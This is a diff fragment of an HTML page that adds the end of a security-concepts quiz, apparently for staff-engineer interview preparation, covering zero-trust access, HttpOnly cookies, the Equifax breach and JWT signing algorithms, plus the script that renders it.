+                        "Using static API keys assigned to each employee"
+                    ],
+                    correct: 2,
+                    explanation: "BeyondCorp eliminates the VPN. All access goes through an access proxy that makes real-time policy decisions based on user identity, device health, and request context regardless of network location."
+                },
+                {
+                    question: "Which cookie attribute prevents JavaScript from reading the cookie?",
+                    options: [
+                        "Secure",
+                        "SameSite=Strict",
+                        "HttpOnly",
+                        "Path=/"
+                    ],
+                    correct: 2,
+                    explanation: "HttpOnly prevents client-side JavaScript from accessing the cookie via document.cookie, which is critical for preventing XSS-based session theft."
+                },
+                {
+                    question: "What was the root cause that allowed the Equifax breach to go undetected?",
+                    options: [
+                        "Weak passwords on user accounts",
+                        "An expired TLS inspection certificate that blinded their monitoring",
+                        "A misconfigured firewall rule",
+                        "An insider threat from a disgruntled employee"
+                    ],
+                    correct: 1,
+                    explanation: "An SSL/TLS inspection certificate had expired 19 months earlier, which meant encrypted data exfiltration traffic was not being inspected and the breach went undetected for months."
+                },
+                {
+                    question: "In a microservices architecture, what is the recommended JWT signing algorithm and why?",
+                    options: [
+                        "HS256, because it's faster and simpler",
+                        "RS256, because only the auth service needs the private key; all others verify with the public key",
+                        "None/unsigned, because services trust each other on the internal network",
+                        "AES-256, because it provides encryption and signing"
+                    ],
+                    correct: 1,
+                    explanation: "RS256 (asymmetric) is preferred because the private key stays with the auth service while all other services verify using the public key from a JWKS endpoint. This reduces blast radius compared to HS256 where the shared secret must be distributed to every verifier."
+                }
+            ];
+
+            if (typeof StaffEngPrep !== 'undefined' && StaffEngPrep.Quiz) {
+                const quiz = new StaffEngPrep.Quiz('module-quiz', quizQuestions);
+                quiz.render();
+            }
+        });
+    </script>
+    <script src="../assets/js/navbar.js"></script>
+    <script src="sidebar.js"></script>
+</body>
+</html>
